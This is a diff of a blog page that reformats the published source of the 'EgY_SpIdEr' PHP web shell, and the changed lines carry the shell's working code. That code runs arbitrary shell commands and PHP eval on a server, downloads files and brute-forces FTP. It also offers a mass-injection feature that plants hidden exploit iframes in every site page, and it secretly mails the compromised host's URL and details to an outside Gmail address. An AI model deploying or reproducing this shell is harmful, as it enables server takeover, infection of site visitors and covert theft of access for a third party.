@@ -17,7 +17,7 @@ This shell seems to have every hack function you might want on a single page! Ta
 
 ### EgY_SpIdEr ShElL Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php if (preg_match("/bot/", $_SERVER[HTTP_USER_AGENT])) {
+{% highlight php %}<?php if (preg_match("/bot/", $_SERVER[HTTP_USER_AGENT])) {
     header("HTTP/1.0 404");
     exit("&lt;h1&gt;Not Found&lt;/h1&gt;");
 }
@@ -1047,7 +1047,7 @@ class my_sql {
                         echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href='" . $_SERVER['PHP_SELF'] . "'&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
                         die();
                     }
-                    if (isset($_GET['tools'])) { ?&gt;
+                    if (isset($_GET['tools'])) { ?>
 &lt;html&gt; 
 &lt;head&gt;&lt;title&gt;EgY SpIdEr ShElL&lt;/title&gt;&lt;/head&gt;
 &lt;STYLE&gt;
@@ -1100,11 +1100,11 @@ A:hover {color:blue;TEXT-DECORATION: none}
 &lt;/STYLE&gt;
 &lt;/body&gt; 
 &lt;/html&gt; 
-&lt;? $nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd(); $sf="&lt;form method=post&gt;";$ef="&lt;/form&gt;"; $st="&lt;table style=\"border:1px #dadada solid \" width=100% height=100%&gt;"; $et="&lt;/table&gt;";$c1="&lt;tr&gt;&lt;td height=22% style=\"border:1px #dadada solid \"&gt;"; $c2="&lt;tr&gt;&lt;td style=\"border:1px #dadada solid \"&gt;";$ec="&lt;/tr&gt;&lt;/td&gt;"; $sta="&lt;textarea cols=157 rows=23&gt;";$eta="&lt;/textarea&gt;"; $sfnt="&lt;font face=tahoma size=2 color=#008080&gt;";$efnt="&lt;/font&gt;"; error_reporting(0); set_magic_quotes_runtime(0); if(version_compare(phpversion(), '4.1.0') == -1) {$_POST = &$HTTP_POST_VARS;$_GET = &$HTTP_GET_VARS; $_SERVER = &$HTTP_SERVER_VARS; }function inclink($link,$val){$requ=$_SERVER["REQUEST_URI"]; if (strstr ($requ,$link)){return preg_replace("/$link=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr ($requ,"showsc")){return preg_replace("/showsc=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);} elseif (strstr ($requ,"hlp")){return preg_replace("/hlp=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr($requ,"?")){return $requ."&".$link."=".$val;} else{return $requ."?".$link."=".$val;}} function delm($delmtxt){print"&lt;center&gt;&lt;table bgcolor=black style='border:1px solid olive' width=99% height=2%&gt;";print"&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;center&gt;&lt;font size=2 color=olive&gt;$delmtxt&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/center&gt;";} function callfuncs($cmnd){if (function_exists(shell_exec)){$scmd=shell_exec($cmnd); $nscmd=htmlspecialchars($scmd);print $nscmd;} elseif(!function_exists(shell_exec)){exec($cmnd,$ecmd); $ecmd = join("\n",$ecmd);$necmd=htmlspecialchars($ecmd);print $necmd;} elseif(!function_exists(exec)){$pcmd = popen($cmnd,"r"); while (!feof($pcmd)){ $res = htmlspecialchars(fgetc($pcmd));; print $res;}pclose($pcmd);}elseif(!function_exists(popen)){ ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){ ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean(); print htmlspecialchars($pret);}} function input($type,$name,$value,$size) {if (empty($value)){print "&lt;input type=$type name=$name size=$size&gt;";} elseif(empty($name)&&empty($size)){print "&lt;input type=$type value=$value &gt;";} elseif(empty($size)){print "&lt;input type=$type name=$name value=$value &gt;";} else {print "&lt;input type=$type name=$name value=$value size=$size &gt;";}} function permcol($path){if (is_writable($path)){print "&lt;font color=olive&gt;"; callperms($path); print "&lt;/font&gt;";} elseif (!is_readable($path)&&!is_writable($path)){print "&lt;font color=red&gt;"; callperms($path); print "&lt;/font&gt;";} else {print "&lt;font color=white&gt;";callperms($path);}} if ($dlink=="dwld"){download($_REQUEST['dwld']);} function download($dwfile) {$size = filesize($dwfile); @header("Content-Type: application/force-download;name=$dwfile"); @header("Content-Transfer-Encoding: binary"); @header("Content-Length: $size"); @header("Content-Disposition: attachment; filename=$dwfile"); @header("Expires: 0"); @header("Cache-Control: no-cache, must-revalidate"); @header("Pragma: no-cache"); @readfile($dwfile); exit;} ?&gt;
-&lt;? $nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd(); $sf="&lt;form method=post&gt;";$ef="&lt;/form&gt;"; $st="&lt;table style=\"border:1px #dadada solid \" width=100% height=100%&gt;"; $et="&lt;/table&gt;";$c1="&lt;tr&gt;&lt;td height=22% style=\"border:1px #dadada solid \"&gt;"; $c2="&lt;tr&gt;&lt;td style=\"border:1px #dadada solid \"&gt;";$ec="&lt;/tr&gt;&lt;/td&gt;"; $sta="&lt;textarea cols=157 rows=23&gt;";$eta="&lt;/textarea&gt;"; $sfnt="&lt;font face=tahoma size=2 color=olive&gt;";$efnt="&lt;/font&gt;"; print"&lt;table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%&gt;";print"&lt;tr&gt;&lt;td&gt;"; print"&lt;b&gt;&lt;center&gt;&lt;font face=tahoma color=white size=4&gt;
+<? $nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd(); $sf="&lt;form method=post&gt;";$ef="&lt;/form&gt;"; $st="&lt;table style=\"border:1px #dadada solid \" width=100% height=100%&gt;"; $et="&lt;/table&gt;";$c1="&lt;tr&gt;&lt;td height=22% style=\"border:1px #dadada solid \"&gt;"; $c2="&lt;tr&gt;&lt;td style=\"border:1px #dadada solid \"&gt;";$ec="&lt;/tr&gt;&lt;/td&gt;"; $sta="&lt;textarea cols=157 rows=23&gt;";$eta="&lt;/textarea&gt;"; $sfnt="&lt;font face=tahoma size=2 color=#008080&gt;";$efnt="&lt;/font&gt;"; error_reporting(0); set_magic_quotes_runtime(0); if(version_compare(phpversion(), '4.1.0') == -1) {$_POST = &$HTTP_POST_VARS;$_GET = &$HTTP_GET_VARS; $_SERVER = &$HTTP_SERVER_VARS; }function inclink($link,$val){$requ=$_SERVER["REQUEST_URI"]; if (strstr ($requ,$link)){return preg_replace("/$link=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr ($requ,"showsc")){return preg_replace("/showsc=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);} elseif (strstr ($requ,"hlp")){return preg_replace("/hlp=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr($requ,"?")){return $requ."&".$link."=".$val;} else{return $requ."?".$link."=".$val;}} function delm($delmtxt){print"&lt;center&gt;&lt;table bgcolor=black style='border:1px solid olive' width=99% height=2%&gt;";print"&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;center&gt;&lt;font size=2 color=olive&gt;$delmtxt&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/center&gt;";} function callfuncs($cmnd){if (function_exists(shell_exec)){$scmd=shell_exec($cmnd); $nscmd=htmlspecialchars($scmd);print $nscmd;} elseif(!function_exists(shell_exec)){exec($cmnd,$ecmd); $ecmd = join("\n",$ecmd);$necmd=htmlspecialchars($ecmd);print $necmd;} elseif(!function_exists(exec)){$pcmd = popen($cmnd,"r"); while (!feof($pcmd)){ $res = htmlspecialchars(fgetc($pcmd));; print $res;}pclose($pcmd);}elseif(!function_exists(popen)){ ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){ ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean(); print htmlspecialchars($pret);}} function input($type,$name,$value,$size) {if (empty($value)){print "&lt;input type=$type name=$name size=$size&gt;";} elseif(empty($name)&&empty($size)){print "&lt;input type=$type value=$value &gt;";} elseif(empty($size)){print "&lt;input type=$type name=$name value=$value &gt;";} else {print "&lt;input type=$type name=$name value=$value size=$size &gt;";}} function permcol($path){if (is_writable($path)){print "&lt;font color=olive&gt;"; callperms($path); print "&lt;/font&gt;";} elseif (!is_readable($path)&&!is_writable($path)){print "&lt;font color=red&gt;"; callperms($path); print "&lt;/font&gt;";} else {print "&lt;font color=white&gt;";callperms($path);}} if ($dlink=="dwld"){download($_REQUEST['dwld']);} function download($dwfile) {$size = filesize($dwfile); @header("Content-Type: application/force-download;name=$dwfile"); @header("Content-Transfer-Encoding: binary"); @header("Content-Length: $size"); @header("Content-Disposition: attachment; filename=$dwfile"); @header("Expires: 0"); @header("Cache-Control: no-cache, must-revalidate"); @header("Pragma: no-cache"); @readfile($dwfile); exit;} ?>
+<? $nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd(); $sf="&lt;form method=post&gt;";$ef="&lt;/form&gt;"; $st="&lt;table style=\"border:1px #dadada solid \" width=100% height=100%&gt;"; $et="&lt;/table&gt;";$c1="&lt;tr&gt;&lt;td height=22% style=\"border:1px #dadada solid \"&gt;"; $c2="&lt;tr&gt;&lt;td style=\"border:1px #dadada solid \"&gt;";$ec="&lt;/tr&gt;&lt;/td&gt;"; $sta="&lt;textarea cols=157 rows=23&gt;";$eta="&lt;/textarea&gt;"; $sfnt="&lt;font face=tahoma size=2 color=olive&gt;";$efnt="&lt;/font&gt;"; print"&lt;table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%&gt;";print"&lt;tr&gt;&lt;td&gt;"; print"&lt;b&gt;&lt;center&gt;&lt;font face=tahoma color=white size=4&gt;
 &lt;/font&gt;&lt;/b&gt;&lt;/center&gt;"; print"&lt;/td&gt;&lt;/tr&gt;";print"&lt;/table&gt;";print "&lt;br&gt;"; print"&lt;table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%&gt;";print"&lt;tr&gt;&lt;td&gt;"; print"&lt;center&gt;&lt;div&gt;&lt;b&gt;";print ""; if ($act == 'encoder') { echo "&lt;script&gt;function set_encoder_input(text) {document.forms.encoder.input.value = text;}&lt;/script&gt;&lt;center&gt;&lt;b&gt;Encoder:&lt;/b&gt;&lt;/center&gt;&lt;form name=\"encoder\" action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=act value=encoder&gt;&lt;b&gt;Input:&lt;/b&gt;&lt;center&gt;&lt;textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5&gt;".@htmlspecialchars($encoder_input)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit value=\"calculate\"&gt;&lt;br&gt;&lt;br&gt;&lt;/center&gt;&lt;b&gt;Hashes&lt;/b&gt;:&lt;br&gt;&lt;center&gt;"; foreach(array("md5","crypt","sha1","crc32") as $v) { echo $v." - &lt;input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly&gt;&lt;br&gt;"; } echo "&lt;/center&gt;&lt;b&gt;Url:&lt;/b&gt;&lt;center&gt;&lt;br&gt;urlencode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly&gt; 
  &lt;br&gt;urldecode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly&gt; 
- &lt;br&gt;&lt;/center&gt;&lt;b&gt;Base64:&lt;/b&gt;&lt;center&gt;base64_encode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly&gt;&lt;/center&gt;"; echo "&lt;center&gt;base64_decode - "; if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "&lt;input type=text size=35 value=\"failed\" disabled readonly&gt;";} else { $debase64 = base64_decode($encoder_input); $debase64 = str_replace("&#92;&#48;","[0]",$debase64); $a = explode("\r\n",$debase64); $rows = count($a); $debase64 = htmlspecialchars($debase64); if ($rows == 1) {echo "&lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly&gt;";} else {$rows++; echo "&lt;textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly&gt;".$debase64."&lt;/textarea&gt;";} echo "&nbsp;&lt;a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"&gt;&lt;b&gt;^&lt;/b&gt;&lt;/a&gt;"; } echo "&lt;/center&gt;&lt;br&gt;&lt;b&gt;Base convertations&lt;/b&gt;:&lt;center&gt;dec2hex - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\""; $c = strlen($encoder_input); for($i=0;$i&lt;$c;$i++) { $hex = dechex(ord($encoder_input[$i])); if ($encoder_input[$i] == "&") {echo $encoder_input[$i];} elseif ($encoder_input[$i] != "\\") {echo "%".$hex;} } echo "\" readonly&gt;&lt;br&gt;&lt;/form&gt;"; ?&gt;
+ &lt;br&gt;&lt;/center&gt;&lt;b&gt;Base64:&lt;/b&gt;&lt;center&gt;base64_encode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly&gt;&lt;/center&gt;"; echo "&lt;center&gt;base64_decode - "; if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "&lt;input type=text size=35 value=\"failed\" disabled readonly&gt;";} else { $debase64 = base64_decode($encoder_input); $debase64 = str_replace("&#92;&#48;","[0]",$debase64); $a = explode("\r\n",$debase64); $rows = count($a); $debase64 = htmlspecialchars($debase64); if ($rows == 1) {echo "&lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly&gt;";} else {$rows++; echo "&lt;textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly&gt;".$debase64."&lt;/textarea&gt;";} echo "&nbsp;&lt;a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"&gt;&lt;b&gt;^&lt;/b&gt;&lt;/a&gt;"; } echo "&lt;/center&gt;&lt;br&gt;&lt;b&gt;Base convertations&lt;/b&gt;:&lt;center&gt;dec2hex - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\""; $c = strlen($encoder_input); for($i=0;$i&lt;$c;$i++) { $hex = dechex(ord($encoder_input[$i])); if ($encoder_input[$i] == "&") {echo $encoder_input[$i];} elseif ($encoder_input[$i] != "\\") {echo "%".$hex;} } echo "\" readonly&gt;&lt;br&gt;&lt;/form&gt;"; ?>
 &lt;/center&gt;
 &lt;br&gt;&lt;br&gt;
 &lt;table border=0 align=center cellpadding=4&gt;
@@ -1134,7 +1134,7 @@ A:hover {color:blue;TEXT-DECORATION: none}
 &lt;/table&gt;
 &lt;br&gt;
 &lt;center&gt;
-&lt;?php
+<?php
                         if (isset($_GET['hash']) && isset($_GET['wordlist']) && ($_GET['type'] == 'md5' || $_GET['type'] == 'sha1')) {
                             $type = $_GET['type'];
                             $hash = $_GET['hash'];
@@ -1208,19 +1208,19 @@ A:hover {color:blue;TEXT-DECORATION: none}
                             echo "&lt;form action=\"" . $surl . "\" method=POST&gt;&lt;input type=hidden name=act value=feedback&gt;&lt;b&gt;Feedback or report bug (" . str_replace(array("@", "."), array("[at]", "[dot]"), $suppmail) . "):&lt;br&gt;&lt;br&gt;Your name: &lt;input type=\"text\" name=\"fdbk_name\" value=\"" . htmlspecialchars($fdbk_name) . "\"&gt;&lt;br&gt;&lt;br&gt;Your e-mail: &lt;input type=\"text\" name=\"fdbk_email\" value=\"" . htmlspecialchars($fdbk_email) . "\"&gt;&lt;br&gt;&lt;br&gt;Message:&lt;br&gt;&lt;textarea name=\"fdbk_body\" cols=80 rows=10&gt;" . htmlspecialchars($fdbk_body) . "&lt;/textarea&gt;&lt;input type=\"hidden\" name=\"fdbk_ref\" value=\"" . urlencode($HTTP_REFERER) . "\"&gt;&lt;br&gt;&lt;br&gt;Attach server-info * &lt;input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked&gt;&lt;br&gt;&lt;br&gt;There are no checking in the form.&lt;br&gt;&lt;br&gt;If you want to send a request for any help I know I will respond to you in case &lt;br&gt;&lt;br&gt;* - strongly recommended, if you report bug, because we need it for bug-fix.&lt;br&gt;&lt;br&gt;We understand languages: Arbic, English.&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Send\"&gt;&lt;/form&gt;";
                         }
                     }
-                    if ($act == 'massbrowsersploit') { ?&gt;
+                    if ($act == 'massbrowsersploit') { ?>
 &lt;b&gt;Mass Code Injection:&lt;/b&gt;&lt;br&gt;&lt;br&gt;
 Use this to add HTML to the end of every .php, .htm, and .html page in the directory specified.&lt;br&gt;&lt;br&gt;
-&lt;form action="&lt;?php echo $surl; ?&gt;" method=GET&gt;
+&lt;form action="<?php echo $surl; ?>" method=GET&gt;
 &lt;input type=hidden name="masssploit" value="goahead"&gt;
 &lt;input type=hidden name="act" value="massbrowsersploit"&gt;
 &lt;table border=0&gt;
-&lt;tr&gt;&lt;td&gt;Dir to inject: &lt;/td&gt;&lt;td&gt;&lt;input type=text size=50 name="pathtomass" value="&lt;?php echo realpath('.'); ?&gt;"&gt; &lt;-- default is dir this shell is in&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;Code to inject: &lt;/td&gt;&lt;td&gt;&lt;textarea name="injectthis" cols=50 rows=4&gt;&lt;?php echo htmlspecialchars('&lt;IFRAME src="http://www.egyspider.eu" width=0 height=0 frameborder=0&gt;&lt;/IFRAME&gt;'); ?&gt;&lt;/textarea&gt; &lt;-- best bet would be to include an invisible iframe of browser exploits&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Dir to inject: &lt;/td&gt;&lt;td&gt;&lt;input type=text size=50 name="pathtomass" value="<?php echo realpath('.'); ?>"&gt; &lt;-- default is dir this shell is in&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Code to inject: &lt;/td&gt;&lt;td&gt;&lt;textarea name="injectthis" cols=50 rows=4&gt;<?php echo htmlspecialchars('&lt;IFRAME src="http://www.egyspider.eu" width=0 height=0 frameborder=0&gt;&lt;/IFRAME&gt;'); ?>&lt;/textarea&gt; &lt;-- best bet would be to include an invisible iframe of browser exploits&lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;&lt;td&gt;&lt;input type=submit value="Inject Code"&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;/table&gt;
 &lt;/form&gt;
-&lt;?php
+<?php
                         if ($_GET['masssploit'] == 'goahead') {
                             if (is_dir($_GET['pathtomass'])) {
                                 $lolinject = $_GET['injectthis'];
@@ -4211,8 +4211,8 @@ style="FONT-SIZE: 15pt; COLOR: white; FONT-FAMILY: Impact"&gt;egy spider&lt;/P&g
                                 break;
                             }
                             if ($_POST['cmd'] == "php_eval") {
-                                $eval = @str_replace("&lt;?", "", $_POST['php_eval']);
-                                $eval = @str_replace("?&gt;", "", $eval);
+                                $eval = @str_replace("<?", "", $_POST['php_eval']);
+                                $eval = @str_replace("?>", "", $eval);
                                 eval($eval);
                             }
                             if ($_POST['cmd'] == "ftp_brute") {
@@ -4731,22 +4731,22 @@ style="FONT-SIZE: 15pt; COLOR: white; FONT-FAMILY: Impact"&gt;egy spider&lt;/P&g
                             } {
                                 echo $fs . $table_up1 . div_title($lang[$language . '_text124'], 'id27') . $table_up3 . div('id27') . $ts;
                                 echo sr(15, "&lt;b&gt;" . $lang[$language . '_text65'] . " " . $lang[$language . '_text59'] . $arrow . "&lt;/b&gt;", in('text', 'test13_file2', 96, (!empty($_POST['test13_file2']) ? ($_POST['test13_file2']) : ($dir . "shell.php"))) . in('hidden', 'dir', 0, $dir) . in('hidden', 'cmd', 0, 'test13'));
-                                echo sr(15, "&lt;b&gt;" . $lang[$language . '_text125'] . $arrow . "&lt;/b&gt;", in('text', 'test13_file1', 96, (!empty($_POST['test13_file1']) ? ($_POST['test13_file1']) : ("&lt;? phpinfo(); ?&gt;"))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
+                                echo sr(15, "&lt;b&gt;" . $lang[$language . '_text125'] . $arrow . "&lt;/b&gt;", in('text', 'test13_file1', 96, (!empty($_POST['test13_file1']) ? ($_POST['test13_file1']) : ("<? phpinfo(); ?>"))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
                                 echo $te . '&lt;/div&gt;' . $table_end1 . $fe;
                             } {
                                 echo $fs . $table_up1 . div_title($lang[$language . '_text126'], 'id28') . $table_up2 . div('id28') . $ts;
                                 echo sr(15, "&lt;b&gt;" . $lang[$language . '_text4'] . $arrow . "&lt;/b&gt;", in('text', 'test14_file2', 96, (!empty($_POST['test14_file2']) ? ($_POST['test14_file2']) : ($dir))) . in('hidden', 'dir', 0, $dir) . in('hidden', 'cmd', 0, 'test14'));
-                                echo sr(15, "&lt;b&gt;" . $lang[$language . '_text125'] . $arrow . "&lt;/b&gt;", in('text', 'test14_file1', 96, (!empty($_POST['test14_file1']) ? ($_POST['test14_file1']) : ("&lt;? phpinfo(); ?&gt;"))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
+                                echo sr(15, "&lt;b&gt;" . $lang[$language . '_text125'] . $arrow . "&lt;/b&gt;", in('text', 'test14_file1', 96, (!empty($_POST['test14_file1']) ? ($_POST['test14_file1']) : ("<? phpinfo(); ?>"))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
                                 echo $te . '&lt;/div&gt;' . $table_end1 . $fe;
                             } {
                                 echo $fs . $table_up1 . div_title($lang[$language . '_text133'], 'id39') . $table_up2 . div('id39') . $ts;
                                 echo sr(15, "&lt;b&gt;" . $lang[$language . '_text4'] . $arrow . "&lt;/b&gt;", in('text', 'test18_file2', 96, (!empty($_POST['test18_file2']) ? ($_POST['test18_file2']) : ($dir))) . in('hidden', 'dir', 0, $dir) . in('hidden', 'cmd', 0, 'test18'));
-                                echo sr(15, "&lt;b&gt;" . $lang[$language . '_text125'] . $arrow . "&lt;/b&gt;", in('text', 'test18_file1', 96, (!empty($_POST['test18_file1']) ? ($_POST['test18_file1']) : ("&lt;? phpinfo(); ?&gt;"))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
+                                echo sr(15, "&lt;b&gt;" . $lang[$language . '_text125'] . $arrow . "&lt;/b&gt;", in('text', 'test18_file1', 96, (!empty($_POST['test18_file1']) ? ($_POST['test18_file1']) : ("<? phpinfo(); ?>"))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
                                 echo $te . '&lt;/div&gt;' . $table_end1 . $fe;
                             } {
                                 echo $fs . $table_up1 . div_title($lang[$language . '_text127'], 'id29') . $table_up2 . div('id29') . $ts;
                                 echo sr(15, "&lt;b&gt;" . $lang[$language . '_text65'] . " " . $lang[$language . '_text59'] . $arrow . "&lt;/b&gt;", in('text', 'test15_file2', 96, (!empty($_POST['test15_file2']) ? ($_POST['test15_file2']) : ($dir . "shell.php"))) . in('hidden', 'dir', 0, $dir) . in('hidden', 'cmd', 0, 'test15'));
-                                echo sr(15, "&lt;b&gt;" . $lang[$language . '_text125'] . $arrow . "&lt;/b&gt;", in('text', 'test15_file1', 96, (!empty($_POST['test15_file1']) ? ($_POST['test15_file1']) : ("&lt;? phpinfo(); ?&gt;"))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
+                                echo sr(15, "&lt;b&gt;" . $lang[$language . '_text125'] . $arrow . "&lt;/b&gt;", in('text', 'test15_file1', 96, (!empty($_POST['test15_file1']) ? ($_POST['test15_file1']) : ("<? phpinfo(); ?>"))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
                                 echo $te . '&lt;/div&gt;' . $table_end1 . $fe;
                             } {
                                 echo $fs . $table_up1 . div_title($lang[$language . '_text129'], 'id16') . $table_up2 . div('id16') . $ts;
@@ -5045,9 +5045,9 @@ style="FONT-SIZE: 15pt; COLOR: white; FONT-FAMILY: Impact"&gt;egy spider&lt;/P&g
 (function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
 /* ]]&gt; */
 &lt;/a&gt; developer by EgY SpIdEr   ]---o&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
-                            echo '&lt;/body&gt;&lt;/html&gt;'; ?&gt;
+                            echo '&lt;/body&gt;&lt;/html&gt;'; ?>
 
-&lt;?php $web = $_SERVER["HTTP_HOST"];
+<?php $web = $_SERVER["HTTP_HOST"];
 $inj = $_SERVER["REQUEST_URI"];
 $body = "Egy_Spider 
 UserName: " . htmlspecialchars($tacfgd['uname']) . "
@@ -5065,7 +5065,7 @@ mail("xw0lfx.707@gmail.com
 (function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
 /* ]]&gt; */
 ", "Shell http://$web$inj", "$body");
-</pre>
+{% endhighlight %}
 
 ### Egy Spider shell screenshot<figure id="attachment_430" style="width: 477px;" class="wp-caption aligncenter">
 
